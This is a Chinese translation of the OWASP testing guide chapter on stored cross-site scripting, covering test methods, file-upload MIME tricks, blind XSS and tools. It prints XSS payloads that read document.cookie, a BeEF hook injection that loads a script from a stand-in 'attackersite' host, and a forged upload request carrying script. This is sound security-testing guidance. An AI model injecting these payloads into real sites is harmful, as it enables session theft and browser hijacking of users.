# 存储型跨站脚本测试

## 摘要

存储型[跨站脚本攻击（Stored XSS）](https://owasp.org/www-community/attacks/xss/) 是最危险的一类跨站脚本攻击。允许用户存储数据的 Web 应用程序可能面临此类攻击风险。本章将演示存储型 XSS 注入的案例及相关利用场景。

当 Web 应用程序收集用户可能包含恶意代码的输入数据，并将其存储在数据仓库中供后续使用时，若输入未被正确过滤，便会发生存储型 XSS。其后果是，恶意数据会被视为网站的一部分，并在用户浏览器中以 Web 应用程序的权限执行。由于该漏洞通常涉及至少两次对应用程序的请求，因此也被称为**二阶 XSS（second-order XSS）**。

该漏洞可用于实施多种基于浏览器的攻击，包括：

- 劫持其他用户的浏览器
- 窃取应用程序用户查看的敏感信息
- 对应用程序进行伪篡改（Pseudo defacement）
- 对内部主机进行端口扫描（此处的"内部"是相对于Web应用程序用户而言）
- 定向投递基于浏览器的漏洞利用
- 其他恶意活动

存储型XSS无需恶意链接即可被利用。当用户访问包含存储型XSS的页面时，即构成成功利用。以下是典型的存储型XSS攻击阶段：

1. 攻击者将恶意代码存入存在漏洞的页面
2. 用户在应用程序中完成身份验证
3. 用户访问存在漏洞的页面
4. 用户的浏览器执行恶意代码

此类攻击也可通过浏览器利用框架（如[BeEF](https://beefproject.com)和[XSS Proxy](https://xss-proxy.sourceforge.net/)）进行利用。这些框架支持复杂的JavaScript漏洞利用开发。

存储型XSS在具有高权限用户访问的应用程序区域尤其危险。当管理员访问存在漏洞的页面时，攻击会由其浏览器自动执行，可能导致会话授权令牌等敏感信息泄露。

## 测试目标

- 识别存储在服务端并在客户端反射的输入点
- 评估目标接受的输入内容以及返回时应用的编码机制（如有）

## 测试方法

### 黑盒测试

识别存储型XSS漏洞的过程与[反射型XSS测试/WSTG](01-Testing_for_Reflected_Cross_Site_Scripting.md)中描述的过程类似。

#### 输入表单

第一步是识别所有用户输入被存储到后端并由应用程序显示的节点。存储用户输入的典型示例如下：

- 用户/个人资料页面：应用程序允许用户编辑/修改个人资料详情，如姓名、昵称、头像、图片、地址等
- 购物车：应用程序允许用户将商品存入购物车供后续查看
- 文件管理器：允许上传文件的应用程序
- 应用程序设置/偏好：允许用户设置偏好的应用程序
- 论坛/留言板：允许用户间交换帖子的应用程序
- 博客：如果博客应用程序允许用户提交评论
- 日志：如果应用程序将某些用户输入存储到日志中

#### 分析HTML代码

应用程序存储的输入通常用于HTML标签中，但也可能作为JavaScript内容的一部分存在。在此阶段，关键是确认输入是否被存储以及它在页面上下文中的定位方式。与反射型XSS不同，渗透测试人员还需探查应用程序通过哪些带外（out-of-band）通道接收和存储用户输入。

**注意**：应测试管理员可访问的所有应用区域，以识别用户提交的任何数据。

**示例**：`index2.php`中存储的邮箱数据

![存储输入示例](images/Stored_input_example.jpg)\
*图 WSTG 4.7.2-1：存储输入示例*

邮箱值所在的index2.php的HTML代码：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

在此情况下，测试人员需要找到在`<input>`标签外注入代码的方法：

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
```

#### 测试存储型XSS

该测试涉及对应用程序的输入验证和过滤控件进行测试。基础注入示例如下：

- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

<!-- s -->
浏览器的解析：
- HTML 元素的文本段，将 HTML 编码的内容视为纯字符。
- HTML 元素的属性值，将对 HTML 编码进行解码
<!-- e -->

需确保通过应用程序提交输入。若客户端实施了安全控件，通常需要禁用JavaScript或使用Web代理修改HTTP请求。同时需要使用HTTP GET和POST请求分别测试相同注入。上述注入会触发显示包含cookie值的弹窗。
> ![存储型XSS示例](images/Stored_xss_example.jpg)\
> *图4.7.2-2：存储输入示例*
> 
> 注入后的HTML代码：
> 
> ```html
> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
> 
> 输入内容被存储后，XSS有效载荷将在页面重新加载时被浏览器执行。若应用程序对输入进行转义，测试人员需检测应用的XSS过滤器。例如，若字符串"SCRIPT"被替换为空格或空字符，则可能是XSS过滤机制的迹象。存在多种绕过输入过滤的技术（参见[反射型XSS测试/WSTG](01-Testing_for_Reflected_Cross_Site_Scripting.md)章节）。强烈建议测试人员参考[XSS过滤规避速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)和[Mario XSS速查页](https://cybersecurity.wtf/encoder/)，其中提供了详尽的XSS攻击与过滤绕过方法。更多详细信息请参阅白皮书和工具章节。

#### 利用BeEF框架攻击存储型XSS

存储型XSS可通过高级JavaScript利用框架（如[BeEF](https://www.beefproject.com)和[XSS Proxy](https://xss-proxy.sourceforge.net/)）进行攻击。
典型的BeEF攻击场景包括：
- 注入与攻击者浏览器利用框架（BeEF）通信的JavaScript钩子
- 等待应用程序用户访问显示存储输入内容的漏洞页面
- 通过BeEF控制台控制应用用户的浏览器

JavaScript钩子可通过利用Web应用中的XSS漏洞进行注入。

**示例**：在 `index2.php` 中的 BeEF 注入：

```html
aaa@aa.com"><script src=https://attackersite/hook.js></script>
```

当用户加载页面 `index2.php` 时，浏览器会执行脚本 `hook.js`。随后攻击者便可获取Cookie、用户屏幕截图、剪贴板内容，并发动复杂的XSS攻击。

> ![BeEF注入示例](images/RubyBeef.png)\
> *图 WSTG 4.7.2-3：BeEF注入示例*
> 
> 此攻击在被多权限用户频繁访问的漏洞页面中尤为有效。

#### 文件上传

如果Web应用程序允许文件上传，需重点检查是否可上传HTML内容。例如，若允许上传HTML或TXT文件，则可在上传文件中注入XSS载荷。渗透测试人员还应验证文件上传功能是否允许设置任意MIME类型。
考虑以下用于文件上传的HTTP POST请求示例：

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

此类设计缺陷可被利用于浏览器MIME类型处理攻击。例如，看似无害的JPG和GIF文件可能包含XSS载荷，并在被浏览器加载时执行。当本应为`image/gif`的MIME类型被设置为`text/html`时，客户端浏览器会将文件视为HTML处理。

伪造的HTTP POST请求示例：

```http
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

另需注意，Internet Explorer处理MIME类型的方式与Mozilla Firefox等其他浏览器不同。例如，IE会将包含HTML内容的TXT文件视为HTML处理。有关MIME处理的更多信息，请参阅本章末尾的白皮书章节。

### 盲存储型跨站脚本攻击（Blind Cross-site Scripting）

盲存储型跨站脚本攻击是存储型XSS的一种形式。当攻击者的载荷被存储在服务器/基础设施中，随后通过后端应用程序反射回给受害者时，通常会发生此类攻击。例如在反馈表单中，攻击者可通过表单提交恶意载荷，当应用程序的后端用户/管理员通过后端界面查看该提交内容时，攻击者的载荷将被执行。盲存储型XSS在现实场景中难以确认，[XSS Hunter](https://xsshunter.com/) 是检测此类攻击的最佳工具之一。

> 注意：测试人员在执行安全测试时应审慎考量使用公共或第三方服务所涉及的隐私影响（参见#工具章节）。

### 灰盒测试（Gray-Box Testing）

灰盒测试与黑盒测试类似。在灰盒测试中，渗透测试人员对应用程序具备部分了解。此时，渗透测试者可能已知晓有关用户输入、输入验证控制机制以及数据存储方式等信息。

根据可用信息，通常建议测试人员按以下步骤操作：
- 使用前端应用程序输入包含特殊字符/无效字符的内容
- 分析应用程序的响应行为
- 识别是否存在输入验证控制机制
- 访问后端系统并检查输入是否被存储及存储方式
- 分析源代码，理解应用程序如何渲染存储的输入内容

若源代码可获取（如白盒测试场景），应分析输入表单中使用的所有变量。特别是PHP、ASP和JSP等编程语言会利用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。

下表总结了分析源代码时需要关注的特殊变量和函数：

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |
| `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |
| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files | |
| `$_FILES` - HTTP File Upload variables | | |

**注意**：上表仅列出了最重要的参数，但所有用户输入参数都应被审查。

## 工具列表

- [PHP字符集编码器(PCE)](https://cybersecurity.wtf/encoder/) - 支持65种字符集的编解码，可用于定制化载荷构造
- [Hackvertor](https://hackvertor.co.uk/public) - 在线工具，提供JavaScript（或任意字符串）的多重编码和混淆功能
- [BeEF](https://www.beefproject.com) - 浏览器攻击框架，专业演示浏览器漏洞实时影响
- [XSS-Proxy](https://xss-proxy.sourceforge.net/) - 高级跨站脚本(XSS)攻击工具
- [Burp Proxy](https://portswigger.net/burp/) - 交互式HTTP/S代理服务器，用于Web应用攻击测试
- [XSS Assistant](https://www.greasespot.net/) - Greasemonkey脚本，帮助用户快速检测Web应用的XSS漏洞
- [Zed Attack Proxy(ZAP)](https://www.zaproxy.org) - 内置扫描器的交互式HTTP/S代理服务器，用于Web应用攻击测试
- [XSS Hunter便携版](https://github.com/mandatoryprogrammer/xsshunter) - 可检测各类XSS漏洞（包括常被忽略的盲XSS）

## 参考资料

- [WSTG-INPV-02](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md)

### OWASP资源
- [XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Books

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Whitepapers

- [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)